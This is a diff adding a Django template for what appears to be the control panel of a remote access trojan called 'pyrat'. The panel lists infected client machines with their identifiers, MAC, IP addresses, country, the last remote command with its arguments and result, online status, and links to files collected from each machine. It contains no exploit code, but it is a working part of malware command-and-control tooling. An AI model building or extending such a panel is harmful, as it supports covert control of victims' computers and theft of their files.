@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    {% load user_tags %}
+    <meta charset="UTF-8">
+    <title>pyrat :: client list</title>
+</head>
+<body>
+    <div id="client_table">
+        <table class="client-table">
+            <tr>
+                <th>Pos</th>
+                <th>Client id</th>
+                <th>PC UUID</th>
+                <th>Join date</th>
+                <th>MAC</th>
+                <th>OS</th>
+                <th>Name</th>
+                <th>Ext IP</th>
+                <th>Int IP</th>
+                <th>Country</th>
+                <th>Last command ID</th>
+                <!-- <th>Last command date/time</th> -->
+                <th>Last command</th>
+                <th>Last command args</th>
+                <th>Last command result</th>
+                <!-- <th>Last command result date/time</th> -->
+                <th>Ping</th>
+                <th>Status</th>
+                <th>Files</th>
+            </tr>
+            {% for client in clients %}
+            <tr>
+                <td>{{ forloop.counter }}</td>
+                <td>{{ client.client_id }}</td>
+                <td>{{ client.pc_uuid }}</td>
+                <td>{{ client.join_datetime|date:"Y-m-d H:i:s" }}</td>
+                <td>{{ client.mac }}</td>
+                <td>{{ client.os }}</td>
+                <td>{{ client.name }}</td>
+                <td>{{ client.ext_ip }}</td>
+                <td>{{ client.int_ip }}</td>
+                <td>{{ client.country }}</td>
+                <td>{{ client.last_command_id }} ({{ client.last_command_datetime|date:"Y-m-d H:i:s" }})</td>
+                <td>{{ client.last_command }}</td>
+                <td>{{ client.last_command_args }}</td>
+                <td>{{ client.last_command_result|linebreaks }}</td>
+                <!-- <td>{{ client.last_command_result_datetime }}</td> -->
+                {% with client.last_activity_datetime|timediff as ping %}
+                <td>
+                    {% if ping < 16 %}
+                    <span class="green">{{ ping }}</span>
+                    {% elif ping < 100 %}
+                    <span class="orange">{{ ping }}</span>
+                    {% else %}
+                    <span class="red">Offline</span>
+                    {% endif %}
+                </td>
+                <td>
+                    {% if client.last_command_id in client.last_command_result and ping < 16  %}
+                    IDDLE
+                    {% elif ping > 100 %}
+                    ------
+                    {% else %}
+                    WORKING
+                    {% endif %}
+                </td>
+                {% endwith %}
+                <td><a href="/media/{{ client.client_id }}/">FILES</a></td>
+            </tr>
+            {% endfor %}
+        </table>
+    </div>
+</body>
+</html>
